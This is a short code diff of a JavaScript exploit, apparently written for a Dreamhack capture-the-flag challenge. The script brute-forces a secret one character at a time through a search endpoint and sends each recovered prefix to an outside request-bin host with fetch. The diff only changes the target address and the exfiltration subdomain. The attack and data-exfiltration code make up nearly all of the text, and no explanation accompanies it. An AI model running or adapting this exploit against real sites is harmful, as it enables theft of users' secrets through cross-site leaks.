@@ -23,7 +23,7 @@
             async function search(query) {
                 try {
                     await req(
-                    `http://localhost:8000/search?query=${query}`
+                    `http://127.0.0.1:8000/search?query=${query}`
                     );
                     return true;
                 } catch (e) {
@@ -43,7 +43,7 @@
                         await new Promise(resolve => setTimeout(resolve, 100)); // Delay to avoid rate limiting
                         if (await search(secret + c)) {
                             secret += c;
-                            fetch(`https://gubujkt.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
+                            fetch(`https://fyttbsg.request.dreamhack.games?flag=${encodeURIComponent(secret)}`, {
                                 mode: 'no-cors'
                             });
                             console.log(`found: ${secret}`);
